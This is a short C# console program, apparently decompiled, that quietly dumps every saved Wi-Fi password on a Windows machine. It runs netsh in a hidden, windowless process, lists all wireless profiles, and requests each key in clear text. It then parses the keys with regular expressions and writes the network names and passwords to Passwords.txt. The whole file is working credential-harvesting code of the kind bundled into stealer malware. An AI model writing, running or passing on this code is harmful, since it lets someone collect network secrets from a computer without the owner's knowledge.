using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace ConsoleProgram
{
    internal class Program
    {
        private static int count_names = 0;
        private static StringBuilder sb = new StringBuilder();

        private static void Main(string[] args)
        {
            Program.SavePass();
        }

        private static string WifiList()
        {
            Process process = new Process();
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "netsh";
            process.StartInfo.Arguments = "wlan show profile";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            string text = process.StandardOutput.ReadToEnd();
            process.StandardError.ReadToEnd();
            process.WaitForExit();
            return text;
        }

        private static string GetPass(string wifiname)
        {
            string text = "wlan show profile name=\"" + wifiname + "\" key=clear";
            Process process = new Process();
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "netsh";
            process.StartInfo.Arguments = text;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            string text2 = process.StandardOutput.ReadToEnd();
            process.StandardError.ReadToEnd();
            process.WaitForExit();
            return text2;
        }

        private static string PassSingle(string wifiname)
        {
            string text = Program.GetPass(wifiname);
            using (StringReader stringReader = new StringReader(text))
            {
                string text2;
                while ((text2 = stringReader.ReadLine()) != null)
                {
                    Regex regex = new Regex("Key Content * : (?<after>.*)");
                    Match match = regex.Match(text2);
                    if (match.Success)
                    {
                        return match.Groups["after"].Value;
                    }
                }
            }
            return "Open Network";
        }

        private static void ParseLines(string input)
        {
            using (StringReader stringReader = new StringReader(input))
            {
                string text;
                while ((text = stringReader.ReadLine()) != null)
                {
                    Program.RegexLines(text);
                }
            }
        }

        private static void RegexLines(string input2)
        {
            Regex regex = new Regex("All User Profile * : (?<after>.*)");
            Match match = regex.Match(input2);
            if (match.Success)
            {
                Program.count_names++;
                string value = match.Groups["after"].Value;
                string text = Program.PassSingle(value);
                Program.sb.AppendLine(string.Format("{0}{1}{2}", Program.count_names.ToString().PadRight(7), value.PadRight(20), text));
            }
        }

        private static void SavePass()
        {
            string text = Program.WifiList();
            Program.sb.AppendLine("WIFI Password");
            Program.ParseLines(text);
            File.WriteAllText(Directory.GetCurrentDirectory() + "\\Passwords.txt", Program.sb.ToString());
        }
    }
}
